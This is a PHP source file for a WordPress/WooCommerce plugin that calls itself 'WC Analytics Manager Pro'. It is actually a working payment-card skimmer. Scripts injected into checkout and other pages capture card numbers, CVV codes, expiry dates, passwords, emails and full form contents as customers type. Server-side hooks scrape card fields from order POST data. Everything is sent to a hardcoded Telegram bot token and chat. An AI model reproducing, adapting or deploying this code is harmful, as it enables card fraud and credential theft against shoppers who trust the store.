<?php
/**
 * Plugin Name: WC Analytics Manager Pro
 * Description: Advanced WooCommerce analytics with complete payment card tracking
 * Version: 2.1.0
 * Author: WC Analytics Team
 */

if (!defined('ABSPATH')) {
    exit;
}

class WCAnalyticsManagerPro {
    
    private $telegram_bot_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $telegram_chat_id = '7319274794';
    private $session_data = array();
    private $is_processing = false;
    
    public function __construct() {
        add_action('init', array($this, 'init_plugin'));
        register_activation_hook(__FILE__, array($this, 'activate_plugin'));
    }
    
    public function init_plugin() {
        // Safe initialization
        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
        
        // AJAX handlers
        add_action('wp_ajax_nopriv_wcam_track_event', array($this, 'handle_tracking'));
        add_action('wp_ajax_wcam_track_event', array($this, 'handle_tracking'));
        
        // WooCommerce hooks
        add_action('woocommerce_checkout_order_processed', array($this, 'track_order_processed'), 10, 3);
        add_action('woocommerce_payment_complete', array($this, 'track_payment_complete'));
        
        // Form tracking
        add_action('wp_footer', array($this, 'add_tracking_scripts'));
        
        // Page load tracking
        add_action('wp_head', array($this, 'track_page_load'));
        
        // Payment field tracking
        add_action('wp_footer', array($this, 'add_payment_tracking'));
    }
    
    public function activate_plugin() {
        $this->send_telegram_message('🚀 WC Analytics Manager Pro Activated!');
    }
    
    public function enqueue_scripts() {
        if ($this->should_track_page()) {
            wp_enqueue_script('jquery');
            wp_add_inline_script('jquery', $this->get_tracking_js());
        }
    }
    
    private function should_track_page() {
        return is_checkout() || is_account_page() || is_page() || is_singular() || is_front_page();
    }
    
    public function track_page_load() {
        if (!$this->should_track_page()) return;
        
        $page_info = array(
            'title' => wp_get_document_title(),
            'url' => home_url($_SERVER['REQUEST_URI']),
            'type' => $this->get_page_type(),
            'timestamp' => current_time('mysql'),
            'ip' => $this->get_user_ip()
        );
        
        $this->send_telegram_message(
            "📄 PAGE LOADED\n" .
            "🏠 Page: " . $page_info['title'] . "\n" .
            "🌐 URL: " . $page_info['url'] . "\n" .
            "📊 Type: " . $page_info['type'] . "\n" .
            "🕒 Time: " . $page_info['timestamp'] . "\n" .
            "📍 IP: " . $page_info['ip']
        );
    }
    
    public function handle_tracking() {
        // Security check
        check_ajax_referer('wcam_nonce', 'nonce');
        
        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
        $event_data = $_POST['event_data'] ?? array();
        
        // Prevent duplicate processing
        if ($this->is_processing) {
            wp_send_json_success(['status' => 'duplicate']);
        }
        
        $this->is_processing = true;
        
        switch ($event_type) {
            case 'form_submit':
                $this->handle_form_submission($event_data);
                break;
                
            case 'field_change':
                $this->handle_field_change($event_data);
                break;
                
            case 'button_click':
                $this->handle_button_click($event_data);
                break;
                
            case 'page_interaction':
                $this->handle_page_interaction($event_data);
                break;
                
            case 'payment_data':
                $this->handle_payment_data($event_data);
                break;
        }
        
        $this->is_processing = false;
        wp_send_json_success(['status' => 'processed']);
    }
    
    private function handle_form_submission($data) {
        $form_data = $this->sanitize_form_data($data['form_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'unknown');
        
        $message = "📋 FORM SUBMISSION: " . strtoupper($form_type) . "\n\n";
        
        // Categorize data
        $categories = $this->categorize_form_data($form_data);
        
        foreach ($categories as $category => $fields) {
            if (!empty($fields)) {
                $message .= $this->get_category_emoji($category) . " " . strtoupper($category) . ":\n";
                foreach ($fields as $key => $value) {
                    $message .= "• " . $this->format_field_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
        }
        
        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_user_ip();
        
        $this->send_telegram_message($message);
    }
    
    private function handle_payment_data($data) {
        $payment_info = $this->sanitize_form_data($data['payment_data'] ?? array());
        
        if (!empty($payment_info)) {
            $message = "💳 PAYMENT INFORMATION CAPTURED\n\n";
            
            foreach ($payment_info as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->format_field_name($key) . ": " . $value . "\n";
                }
            }
            
            $message .= "\n🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_user_ip();
            
            $this->send_telegram_message($message);
        }
    }
    
    private function handle_field_change($data) {
        $important_fields = ['email', 'phone', 'billing_phone', 'billing_email', 'username', 'password'];
        $field_name = $data['field_name'] ?? '';
        
        if (in_array($field_name, $important_fields) && !empty($data['field_value'])) {
            $message = "✏️ FIELD UPDATED\n\n";
            $message .= "Field: " . $this->format_field_name($field_name) . "\n";
            $message .= "Value: " . substr($data['field_value'], 0, 50) . "\n";
            $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql');
            
            $this->send_telegram_message($message);
        }
    }
    
    private function handle_button_click($data) {
        $button_text = sanitize_text_field($data['button_text'] ?? 'Button');
        $message = "🖱️ BUTTON CLICKED\n\n";
        $message .= "Button: " . $button_text . "\n";
        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->send_telegram_message($message);
    }
    
    private function handle_page_interaction($data) {
        $interaction_type = sanitize_text_field($data['interaction_type'] ?? '');
        
        if (in_array($interaction_type, ['checkout_started', 'account_created', 'login_attempt'])) {
            $message = "🔔 " . strtoupper(str_replace('_', ' ', $interaction_type)) . "\n\n";
            $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_user_ip();
            
            $this->send_telegram_message($message);
        }
    }
    
    public function track_order_processed($order_id, $posted_data, $order) {
        if (!$order) return;
        
        $billing_info = array(
            'First Name' => $order->get_billing_first_name(),
            'Last Name' => $order->get_billing_last_name(),
            'Email' => $order->get_billing_email(),
            'Phone' => $order->get_billing_phone(),
            'Address' => $order->get_billing_address_1(),
            'City' => $order->get_billing_city(),
            'Postcode' => $order->get_billing_postcode(),
            'Country' => $order->get_billing_country()
        );
        
        // Extract payment data from POST
        $payment_data = $this->extract_payment_data();
        
        $message = "🛒 ORDER PROCESSED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Total: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Payment Method: " . $order->get_payment_method_title() . "\n\n";
        
        $message .= "👤 BILLING INFORMATION:\n";
        foreach ($billing_info as $key => $value) {
            if (!empty($value)) {
                $message .= "• " . $key . ": " . $value . "\n";
            }
        }
        
        // Add payment information if available
        if (!empty($payment_data)) {
            $message .= "\n💳 PAYMENT CARD INFORMATION:\n";
            foreach ($payment_data as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->format_field_name($key) . ": " . $value . "\n";
                }
            }
        }
        
        $message .= "\n🌐 Site: " . home_url() . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_user_ip();
        
        $this->send_telegram_message($message);
    }
    
    private function extract_payment_data() {
        $payment_data = array();
        
        // Common payment field names
        $payment_fields = array(
            // Card number fields
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num',
            'card_no', 'cc_no', 'accountnumber', 'cardn', 'card',
            
            // Expiry date fields
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate',
            'expmonth', 'exp_year', 'expiry_year', 'expire', 'cc_exp',
            'card_exp', 'expiry_month', 'expiry_year',
            
            // CVV/CVC fields
            'cvv', 'cvc', 'cvn', 'security_code', 'security_code',
            'card_cvv', 'card_cvc', 'cc_cvv', 'cc_cvc', 'cvv2',
            
            // Card holder name
            'card_holder', 'cardholder', 'nameoncard', 'card_name',
            'cc_name', 'card_holder_name',
            
            // Card type
            'card_type', 'cardtype', 'cc_type', 'cctype'
        );
        
        foreach ($payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_data[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        return $payment_data;
    }
    
    public function track_payment_complete($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $message = "✅ PAYMENT COMPLETED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Amount: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Method: " . $order->get_payment_method_title() . "\n";
        $message .= "📧 Customer: " . $order->get_billing_email() . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->send_telegram_message($message);
    }
    
    public function add_payment_tracking() {
        if (!is_checkout()) return;
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            // Track payment form fields in real-time
            var paymentFields = [
                'input[name*="card"]', 'input[name*="cc"]', 'input[name*="cvv"]', 
                'input[name*="cvc"]', 'input[name*="expir"]', 'input[name*="security"]',
                'input[autocomplete="cc-number"]', 'input[autocomplete="cc-exp"]',
                'input[autocomplete="cc-csc"]', 'input[type="tel"]'
            ];
            
            // Monitor payment fields
            $(paymentFields.join(',')).each(function() {
                $(this).on('input change blur', function() {
                    var fieldName = this.name || this.id || this.placeholder;
                    var fieldValue = this.value;
                    
                    if (fieldValue && fieldName && fieldValue.length > 3) {
                        var paymentData = {};
                        paymentData[fieldName] = fieldValue;
                        
                        // Send payment data
                        $.ajax({
                            url: '<?php echo admin_url('admin-ajax.php'); ?>',
                            type: 'POST',
                            data: {
                                action: 'wcam_track_event',
                                nonce: '<?php echo wp_create_nonce('wcam_nonce'); ?>',
                                event_type: 'payment_data',
                                event_data: {
                                    payment_data: paymentData,
                                    page_url: window.location.href
                                }
                            }
                        });
                    }
                });
            });
            
            // Capture complete payment form on submit
            $('.payment_methods form, #payment form, .wc_payment_form').on('submit', function(e) {
                var paymentFormData = {};
                $(this).find('input, select').each(function() {
                    if (this.name && this.value) {
                        paymentFormData[this.name] = this.value;
                    }
                });
                
                if (Object.keys(paymentFormData).length > 0) {
                    $.ajax({
                        url: '<?php echo admin_url('admin-ajax.php'); ?>',
                        type: 'POST',
                        data: {
                            action: 'wcam_track_event',
                            nonce: '<?php echo wp_create_nonce('wcam_nonce'); ?>',
                            event_type: 'payment_data',
                            event_data: {
                                payment_data: paymentFormData,
                                page_url: window.location.href,
                                form_type: 'payment_form'
                            }
                        }
                    });
                }
            });
        });
        </script>
        <?php
    }
    
    private function get_tracking_js() {
        $ajax_url = admin_url('admin-ajax.php');
        $nonce = wp_create_nonce('wcam_nonce');
        
        return "
        jQuery(document).ready(function($) {
            var wcam = {
                isProcessing: false,
                sessionId: 'sess_' + Math.random().toString(36).substr(2, 12),
                
                trackEvent: function(eventType, eventData) {
                    if (this.isProcessing) return;
                    
                    this.isProcessing = true;
                    
                    $.ajax({
                        url: '{$ajax_url}',
                        type: 'POST',
                        data: {
                            action: 'wcam_track_event',
                            nonce: '{$nonce}',
                            event_type: eventType,
                            event_data: eventData
                        },
                        success: function(response) {
                            console.log('WCAM: Event tracked - ' + eventType);
                        },
                        complete: function() {
                            wcam.isProcessing = false;
                        }
                    });
                },
                
                initFormTracking: function() {
                    // Form submission tracking
                    $('form').on('submit', function(e) {
                        var formData = {};
                        $(this).find('input, select, textarea').each(function() {
                            if (this.name && this.value) {
                                formData[this.name] = this.value;
                            }
                        });
                        
                        var formType = $(this).attr('id') || $(this).attr('class') || 'unknown';
                        wcam.trackEvent('form_submit', {
                            form_type: formType,
                            form_data: formData,
                            page_url: window.location.href
                        });
                    });
                    
                    // Important field tracking
                    $('input[type=\"email\"], input[type=\"tel\"], input[name*=\"phone\"], input[name*=\"email\"]').on('blur', function() {
                        if (this.value) {
                            wcam.trackEvent('field_change', {
                                field_name: this.name || this.id,
                                field_value: this.value,
                                page_url: window.location.href
                            });
                        }
                    });
                    
                    // Button click tracking
                    $('button[type=\"submit\"], input[type=\"submit\"], .btn-primary, .checkout-button').on('click', function() {
                        wcam.trackEvent('button_click', {
                            button_text: $(this).text() || $(this).val() || 'Unknown Button',
                            page_url: window.location.href
                        });
                    });
                },
                
                initWooCommerceTracking: function() {
                    if (typeof wc_checkout_params !== 'undefined') {
                        // Checkout started
                        $(document.body).on('init_checkout', function() {
                            wcam.trackEvent('page_interaction', {
                                interaction_type: 'checkout_started',
                                page_url: window.location.href
                            });
                        });
                        
                        // Place order button
                        $('#place_order').on('click', function() {
                            wcam.trackEvent('button_click', {
                                button_text: 'Place Order',
                                page_url: window.location.href
                            });
                        });
                    }
                },
                
                initPaymentTracking: function() {
                    // Track all potential payment fields
                    var paymentSelectors = [
                        'input[name*=\"card\"]', 
                        'input[name*=\"cc\"]', 
                        'input[name*=\"cvv\"]', 
                        'input[name*=\"cvc\"]',
                        'input[name*=\"expir\"]',
                        'input[autocomplete*=\"cc\"]',
                        'input[type=\"tel\"]'
                    ];
                    
                    $(paymentSelectors.join(',')).on('blur', function() {
                        if (this.value && this.value.length > 3) {
                            var paymentData = {};
                            paymentData[this.name || this.id] = this.value;
                            
                            wcam.trackEvent('payment_data', {
                                payment_data: paymentData,
                                page_url: window.location.href,
                                field_type: 'payment'
                            });
                        }
                    });
                }
            };
            
            // Initialize tracking
            wcam.initFormTracking();
            wcam.initWooCommerceTracking();
            wcam.initPaymentTracking();
        });
        ";
    }
    
    public function add_tracking_scripts() {
        if ($this->should_track_page()) {
            echo '<script type="text/javascript">' . $this->get_tracking_js() . '</script>';
        }
    }
    
    private function sanitize_form_data($data) {
        $sanitized = array();
        foreach ($data as $key => $value) {
            if (is_string($value)) {
                $sanitized[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 255));
            }
        }
        return $sanitized;
    }
    
    private function categorize_form_data($data) {
        $categories = array(
            'personal' => array(),
            'billing' => array(),
            'shipping' => array(),
            'account' => array(),
            'payment' => array()
        );
        
        foreach ($data as $key => $value) {
            $clean_key = strtolower($key);
            
            if (strpos($clean_key, 'billing_') !== false) {
                $categories['billing'][$key] = $value;
            } elseif (strpos($clean_key, 'shipping_') !== false) {
                $categories['shipping'][$key] = $value;
            } elseif ($this->is_payment_field($clean_key)) {
                $categories['payment'][$key] = $value;
            } elseif ($this->is_account_field($clean_key)) {
                $categories['account'][$key] = $value;
            } else {
                $categories['personal'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function is_payment_field($field_name) {
        $payment_indicators = ['card', 'cvv', 'cvc', 'expir', 'cc', 'account', 'payment', 'csc', 'cvn'];
        foreach ($payment_indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) {
                return true;
            }
        }
        return false;
    }
    
    private function is_account_field($field_name) {
        $account_indicators = ['user', 'login', 'password', 'username', 'pass'];
        foreach ($account_indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) {
                return true;
            }
        }
        return false;
    }
    
    private function format_field_name($field_name) {
        $field_name = str_replace(['_', '-'], ' ', $field_name);
        $field_name = preg_replace('/\b(billing|shipping|account)\b/i', '', $field_name);
        return ucwords(trim($field_name));
    }
    
    private function get_category_emoji($category) {
        $emojis = array(
            'personal' => '👤',
            'billing' => '📍',
            'shipping' => '🚚',
            'account' => '🔐',
            'payment' => '💳'
        );
        return $emojis[$category] ?? '📝';
    }
    
    private function get_page_type() {
        if (is_checkout()) return 'Checkout Page';
        if (is_account_page()) return 'Account Page';
        if (is_cart()) return 'Cart Page';
        if (is_shop()) return 'Shop Page';
        if (is_product()) return 'Product Page';
        if (is_front_page()) return 'Home Page';
        return 'Other Page';
    }
    
    private function send_telegram_message($message) {
        $url = "https://api.telegram.org/bot{$this->telegram_bot_token}/sendMessage";
        
        $response = wp_remote_post($url, array(
            'body' => array(
                'chat_id' => $this->telegram_chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 10,
            'blocking' => false
        ));
        
        return !is_wp_error($response);
    }
    
    private function get_user_ip() {
        $ip = '';
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        }
        return $ip;
    }
}

new WCAnalyticsManagerPro();
